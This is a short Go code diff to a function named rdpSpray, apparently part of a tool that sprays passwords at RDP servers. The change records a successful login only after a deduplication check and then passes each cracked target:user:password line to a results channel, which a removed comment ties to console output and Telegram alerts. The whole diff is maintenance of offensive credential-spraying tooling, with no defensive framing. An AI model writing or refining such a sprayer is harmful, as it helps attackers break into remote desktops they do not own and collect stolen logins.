@@ -167,7 +167,7 @@ func rdpSpray(wg *sync.WaitGroup, results chan string, job task, progress *int32
 								globalMonitor.RecordFailure()
 							} else {
 								isHit = true
-								globalMonitor.RecordSuccess()
+								// RecordSuccess moved to after deduplication check
 							}
 						})
 						loginDone <- true
@@ -202,13 +202,18 @@ func rdpSpray(wg *sync.WaitGroup, results chan string, job task, progress *int32
 
 						// Write immediately to file with fsync (critical for crash recovery)
 						successLine := targetStr + ":" + user + ":" + pass + "\n"
-						writeCredentialsImmediately(successLine)
+						written := writeCredentialsImmediately(successLine)
 
-						// Send to channel for console output and Telegram alerts
-						select {
-						case results <- targetStr + ":" + user + ":" + pass:
-						case <-shutdown:
-							return
+						// Only process if not a duplicate
+						if written {
+							// Record success AFTER deduplication (accurate monitoring)
+							globalMonitor.RecordSuccess()
+
+							select {
+							case results <- targetStr + ":" + user + ":" + pass:
+							case <-shutdown:
+								return
+							}
 						}
 					}
 
